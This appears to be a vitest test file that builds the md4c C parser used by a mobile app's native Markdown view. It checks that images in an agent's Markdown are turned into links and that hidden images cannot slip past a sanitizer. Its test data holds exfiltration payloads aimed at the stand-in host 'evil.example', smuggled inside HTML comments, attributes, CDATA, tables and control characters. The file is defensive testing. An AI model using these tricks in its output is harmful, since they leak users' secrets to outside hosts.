// SPDX-License-Identifier: MIT
// Copyright (c) 2026 Max Boksem

// What the native view's own parser reads in an agent's Markdown. `marked`
// and md4c disagree on some text, so this builds the C the phone runs with
// this computer's compiler, and skips where there is none.

import { execFileSync, spawnSync } from "node:child_process";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";

import { afterAll, beforeAll, describe, expect, it } from "vitest";

import { safeBlock } from "./markdown";

const CPP = fileURLToPath(
	new URL("../../node_modules/react-native-enriched-markdown/cpp/", import.meta.url)
);

const HARNESS = `
#include "MD4CParser.hpp"
#include <iostream>
#include <iterator>
using namespace Markdown;
static void walk(const MarkdownASTNode &node) {
  const auto url = node.attributes.find("url");
  const std::string address = url == node.attributes.end() ? "" : url->second;
  if (node.type == NodeType::Image) std::cout << "image " << address << "\\n";
  if (node.type == NodeType::Link) std::cout << "link " << address << "\\n";
  for (const auto &child : node.children) walk(*child);
}
int main() {
  std::string text((std::istreambuf_iterator<char>(std::cin)), std::istreambuf_iterator<char>());
  Md4cFlags flags;
  flags.latexMath = false;
  MD4CParser parser;
  walk(*parser.parse(text, flags, true));
}
`;

const hasCompiler = ["cc", "c++"].every(
	(tool) => spawnSync(tool, ["--version"], { stdio: "ignore" }).status === 0
);

describe.skipIf(!hasCompiler)("the native view's parser", () => {
	let dir = "";
	const read = (markdown: string): string[] =>
		execFileSync(join(dir, "harness"), { input: markdown, encoding: "utf8" })
			.split("\n")
			.filter(Boolean);

	beforeAll(() => {
		dir = mkdtempSync(join(tmpdir(), "md4c-"));
		const harness = join(dir, "harness.cpp");
		writeFileSync(harness, HARNESS);
		const md4c = join(dir, "md4c.o");
		execFileSync("cc", ["-c", join(CPP, "md4c/md4c.c"), "-o", md4c]);
		execFileSync("c++", [
			"-std=c++17",
			`-I${join(CPP, "parser")}`,
			harness,
			join(CPP, "parser/MD4CParser.cpp"),
			md4c,
			"-o",
			join(dir, "harness"),
		]);
		// macOS checks a new program the first time it runs, which can take
		// seconds on a busy machine, so that wait lands here and not in a test.
		read("");
	}, 180_000);

	afterAll(() => {
		if (dir) rmSync(dir, { recursive: true, force: true });
	});

	const leak = "https://evil.example/t.png?leak=SECRET";

	it("makes an image a link to its address", () => {
		expect(read(`![a](${leak})`)).toEqual([`link ${leak}`]);
	});

	it("never reports an image the Markdown check missed", () => {
		for (const block of [
			`Done <!-- ![x](${leak}) -->`,
			`Done <a title="![x](${leak})">`,
			`Done <?x ![x](${leak}) ?>`,
			`Done <!X ![x](${leak})>`,
			`Done <![CDATA[![x](${leak})]]>`,
			`| a |\n| - |\n| ![x](${leak}|b) |`,
			`![a](\f${leak})`,
			`![a](\v${leak})`,
		]) {
			for (const text of [block, safeBlock(block).markdown]) {
				expect(read(text).filter((line) => line.startsWith("image"))).toEqual([]);
			}
		}
	});
});
